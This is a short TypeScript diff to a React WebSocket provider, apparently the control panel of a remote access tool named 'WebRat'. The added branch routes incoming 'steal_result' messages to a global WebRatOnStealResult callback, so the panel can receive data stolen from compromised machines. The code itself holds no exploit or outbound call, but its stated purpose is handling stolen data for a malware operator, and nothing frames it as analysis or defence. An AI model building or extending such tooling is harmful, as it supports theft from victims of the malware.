@@ -166,6 +166,12 @@ export function PanelWsProvider(props: { children: React.ReactNode }) {
                     if (typeof fn === "function") fn(out != null ? String(out) : "");
                 } catch {
                 }
+            } else if (t === "steal_result") {
+                try {
+                    const fn = (window as unknown as { WebRatOnStealResult?: unknown }).WebRatOnStealResult;
+                    if (typeof fn === "function") fn(obj);
+                } catch {
+                }
             }
 
             dispatchWsMessage(msg as WsJson);
